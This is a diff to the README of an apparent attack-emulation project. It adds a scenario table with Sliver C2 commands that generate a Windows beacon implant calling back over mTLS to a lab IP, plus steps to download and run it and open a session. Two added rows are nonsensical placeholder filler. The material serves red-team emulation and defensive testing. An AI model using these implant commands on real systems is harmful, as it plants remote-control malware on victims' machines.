@@ -52,8 +52,8 @@ Each folder in `examples/` contains an attach chain, which includes the emulatio
 | preconditions   | The conditions that must be met before the attack step can be successfully executed.  |
 | effects   | The outcomes or changes that result from executing the attack step. |
 
-## Usage
-### The emulation infrastructure
+## Emulation Scenario
+### The Infrastructure
 <p align="center">
   <img width="800" src="assets/images/the%20emulation%20infrastructure.jpg" alt="cli output"/>
 </p>
@@ -62,9 +62,14 @@ Victims：a Windows 10, a macOS and an Ubuntu
 
 You can download the attack simulation environment from here(https://XXXX)
 
-### Execute the attack manually
+### Scenario Steps
 Each `uuid` encompasses an `executor`, within which the `command` parameter specifies the actual attack command that needs to be executed. You should proceed manually through the attack steps in the sequence of the UUIDs. 
-
+| Steps        | Description	       | Executor |
+|:-------------|:--------------------|:---------|
+| Step 0 - Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring | sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls  |
+| Step 1 - Execution | Download&execute the sliver implant   | sliver > sessions -i session_id |
+| ok           | good `oreos`      | hmm   |
+| ok           | good `zoute` drop | yumm  |
 
 
 
